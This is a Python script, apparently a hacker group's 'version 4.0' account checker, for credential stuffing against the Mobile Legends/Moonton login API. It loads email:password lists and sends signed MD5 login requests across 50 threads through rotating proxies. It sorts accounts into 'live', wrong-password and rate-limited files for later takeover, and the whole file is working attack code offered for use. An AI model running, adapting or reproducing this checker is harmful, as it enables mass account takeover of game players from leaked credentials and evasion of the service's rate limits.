# UPDATE : 19 February 2021
# https://blacknetid.pw
# github.com/zlaxtert
# Recode Only Makes You a Loser
# I'M ALONE
# Chat Me @Alone_code404 (Telegram)
# Follow Me @zlaxtert (Instagram)
# I'm a coder KENTANG
# IZROIL MY FRIEND FOREVER

import os, sys, hashlib, json, random, re, time
from BLACKNETID import proxy

localtime = time.asctime( time.localtime(time.time()) )

try:
  from concurrent.futures import ThreadPoolExecutor
except ImportError:
  os.system(
    'pip install futures'
  )
  exit(
    'Please restart this tools'
  )

try:
  from bs4 import BeautifulSoup as bs
except ImportError:
  os.system(
    'pip install bs4'
  )
  exit(
    'Please restart this tools'
  )
  
try:
  import requests
except ImportError:
  os.system(
    'pip install requests'
  )
  exit(
    'Please restart this tools'
  )

api = 'https://accountmtapi.mobilelegends.com/'

class MOONTON:
  def __init__(self, url):
    self.userdata = []
    self.live = []
    self.wrong_password = []
    self.wrong_email = []
    self.limit_login = []
    self.unknown = []
    self.proxy_list = []
    self.api = url
    self.loop = 0
    print('\033[93m DATE : \033[96m', localtime)
    print('''\033[94m

                                                               
 _|_|_|      _|_|    _|      _|  _|_|_|    _|_|_|  _|_|_|_|_|  
 _|    _|  _|    _|  _|_|    _|  _|    _|    _|        _|      
 _|_|_|    _|_|_|_|  _|  _|  _|  _|    _|    _|        _|      
 _|    _|  _|    _|  _|    _|_|  _|    _|    _|        _|      
 _|_|_|    _|    _|  _|      _|  _|_|_|    _|_|_|      _|      
                                                               
\033[0m\n''')


  def auto_upper(self, string):
    text = ''.join(
      re.findall(
        '[a-z-A-Z]',
        string
      )
    )
    if text.islower(
      ) == True:
      o = ''
      for i in range(
        len(
          string
        )
      ):
        if string[i].isnumeric(
          ) == False and string[
            i
          ].isalpha(
          ):
          return o + string[
            i
          ].upper(
          ) + string[
            i+1:
          ]
        else: o+=string[
          i
        ]
      return string 
    else: return string

  def main(self):
    print( '                   \033[92m---\033[95m VERSION \033[0m4.0\033[92m---')
    print( '         \033[0m===[Proxy Change Every 30 Minutes\033[0m]===\n')
    print( ' ')
    empas = input(
      '\033[91m[+]\033[0m Your Fucking List (ex: list.txt): '
    )
    if os.path.exists(
      empas
    ):
      for data in open(
        empas,
        'r',
        encoding='utf-8'
      ).readlines():
        try:
          user = data.strip(
          ).split(
            '|'
          )
          if user[
           0
          ] and user[
            1
          ]:
            em = user[
              0
            ]
            pw = self.auto_upper(
              user[
                1
              ]
            )
            self.userdata.append({
              'email': em,
              'pw': pw,
              'userdata': '|'.join(
                [
                  em,
                  pw
                ]
              )
            })
        except IndexError:
          try:
            user = data.strip().split(
              ':'
            )
            if user[
              0
            ] and user[
              1
            ]:
              em = user[
                0
              ]
              pw = self.auto_upper(
                user[
                  1
                ]
              )
              self.userdata.append({
                'email': em,
                'pw': pw,
                'userdata': ':'.join(
                  [
                    em,
                    pw
                  ]
                )
             })
          except: pass
      if len(
        self.userdata
      ) == 0:
        exit(
          '\033[91m[!]\033[0m Your List Not Found.'
        )
      print(
        '\033[91m[*]\033[0m Total {0} account'.format(
          str(
            len(
              self.userdata
            )
          )
        )
      )
      print(' ')
      print(' [1] No Airplane mode')
      print(' [2] Airplane mode')
      ask = input(
        '\033[91m [+] \033[0mChoose Mode? : '
      )
      if ask.lower(
      ).strip(
      ) == '1':
        self.valid_proxy = proxy.prox(
        )
        with ThreadPoolExecutor(
          max_workers=50
        ) as thread:
          [
            thread.submit(
              self.validate,
              user,
              True
            ) for user in self.userdata
          ]
      else:
        print(
          ''
        )
        with ThreadPoolExecutor(
          max_workers=50
        ) as thread:
          [
            thread.submit(
              self.validate,
              user,
              False
            ) for user in self.userdata
          ]
      print('\n\n===========================================')
      print('\n\033[92mPLEASE CHECK AGAIN FILE => \033[93mrecheck.txt')
      print(
        '\n\033[96m[+]\033[0m \033[92mLIVE: \033[0m'+str(
          len(
            self.live
          )
        )+' - saved: \033[92mlive-moonton.txt\033[0m'
      )
      print(
        '\033[94m[+]\033[0m \033[93mWRONG PASS: \033[0m'+str(
          len(
            self.wrong_password
          )
        )+' - saved: \033[93mwrong-pass-moonton.txt\033[0m'
      )
      print(
        '\033[93m[+]\033[0m \033[91mWRONG EMAIL: \033[0m'+str(
          len(
            self.wrong_email
          )
        )+' - saved: \033[91mwrong-email-moonton.txt'
      )
      print(
        '\033[91m[+]\033[0m \033[94mRECHECK: \033[0m'+str(
          len(
            self.limit_login
          )
        )+' - saved: \033[94mrecheck.txt\033[0m'
      )
      print(
        '\033[95m[+]\033[0m \033[96mUNKNOWN: \033[0m'+str(
          len(
            self.unknown
          )
        )+' - saved: \033[96munknown-moonton.txt\033[0m'
      )
      print('\n===========================================')
      exit(
      )
    else: print(
      '[!] File Not Found "{0}"'.format(
        empas
      )
    )

  def hash_md5(self, string):
    md5 = hashlib.new(
      'md5'
    )
    md5.update(
      string.encode(
        'utf-8'
      )
    )
    return md5.hexdigest(
    )

  def build_params(self, user):
    md5pwd = self.hash_md5(
      user[
        'pw'
      ]
    )
    hashed = self.hash_md5(
      'account={0}&md5pwd={1}&op=login'.format(
        user[
          'email'
        ],
        md5pwd
      )
    )
    return json.dumps({
      'op': 'login',
      'sign': hashed,
      'params': {
        'account': user[
          'email'
        ],
        'md5pwd': md5pwd,
      },
      'lang': 'cn'
    })
  
  def validate(self, user, with_porxy):
    try:
      data = self.build_params(
        user
      )
      headers = {
        'host': 'accountmtapi.mobilelegends.com',
        'user-agent': 'Mozilla/5.0',
        'x-requested-with': 'com.mobile.legends'
      }
      if with_porxy == True:
        proxy = random.choice(
          self.valid_proxy
        )
        response = requests.post(
          self.api,
          data=data,
          headers=headers,
          proxies=proxy,
          timeout=200
        )
      else:
        response = requests.post(
          self.api,
          data=data,
          headers=headers
        )
      if response.status_code == 200:
        if response.json(
        )[
          'message'
         ] == 'Error_Success':
          print(
            '\r\033[93m[+] \033[92mLIVE\033[94m => \033[92m'+user[
              'userdata'
             ]+' \033[0m | \033[93m@BLACKNETID \033[0m V.4.0'
          )
          self.live.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/live-moonton.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_PasswdError':
          print(
            '\r\033[94m[+]\033[0m \033[91mWRONG\033[92m => \033[93m'+user[
              'userdata'
            ]+' \033[0m | \033[94m@BLACKNETID \033[0mV.4.0'
          )
          self.wrong_password.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/wrong-pass-moonton.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_InvalidAccount':
          print(
            '\r\033[94m[+]\033[0m \033[96mACCOUNT NOT FOUND\033[0m => '+user[
              'userdata'
            ]+' \033[0m | \033[96m@BLACKNETID \033[0m V.4.0'
          )
          self.unknown.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/unknown-moonton.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_FailedTooMuch':
          print(
            '\r\033[94m[+]\033[0m RECHECK \033[92m=> \033[91m'+user[
              'userdata'
            ]+' \033[0m| \033[91m@BLACKNETID \033[0mV.4.0'
          )
          self.limit_login.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/recheck.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
         ] == 'Error_PwdErrorTooMany':
          print(
            '\r\033[94m[+]\033[0m RECHECK => '+user[
              'userdata'
            ]+' \033[0m| \033[91m@BLACKNETID \033[0mV.4.0'
          )
          self.limit_login.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/recheck.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
        ] == 'Error_NoAccount':
          print(
            '\r\033[94m[+]\033[0m \033[95mDIE \033[92m => \033[0m'+user[
              'userdata'
            ]+' \033[0m | \033[95m@BLACKNETID \033[0mV.4.0'
          )
          self.wrong_email.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/wrong-email-moonton.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        elif response.json(
        )[
          'message'
        ] == 'Error_InvalidParam':
          print(
            '\r\033[94m[+]\033[0m INVALID PARAMS \033[93m=> \033[0m'+user[
              'userdata'
            ]+' \033[0m | \033[94m@BLACKNETID \033[0mV.4.0'
          )
          self.unknown.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/unknown-moonton.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        else:
          print(
            '\r\033[94m[+]\033[0m \033[93mUNKNOWN\033[0m => '+user[
              'userdata'
            ]+' \033[0m | \033[94m@BLACKNETID \033[0mV.4.0'
          )
          self.unknown.append(
            user[
              'userdata'
            ]
          )
          open(
            'Ress/unknown-moonton.txt',
            'a'
          ).write(
            str(
              user[
                'userdata'
              ]
            )+'\n'
          )
        die = len(
          self.wrong_email
        ) + len(
          self.unknown
        )
        self.loop+=1
        print(
          end='\n\r\033[92m[!] \033[96mCHECK: \033[0m[\033[91m %s \033[0m/\033[96m %s \033[0m] \033[96m| \033[92mLIVE: %s | \033[93m WRONG: %s | \033[90mRECHECK: %s | \033[95mDIE: %s | \033[92m[!]\033[0m'%(
            str(
              self.loop
            ),
            str(
              len(
                self.userdata
              )
            ),
            str(
              len(
                self.live
              )
            ),
            str(
              len(
                self.wrong_password
              )
            ),
            str(
              len(
                self.limit_login
              )
            ),
            str(
              die
            )
          ),
          flush=True
        )
      else: self.validate(
        user,
        with_porxy
      )
    except: self.validate(
      user,
      with_porxy
    )

if __name__ == '__main__':
  try:
    (
      MOONTON(
        api
      ).main(
      )
    )
  except Exception as E:
    exit(
      '[!] Error: %s' %(
        E
      )
    )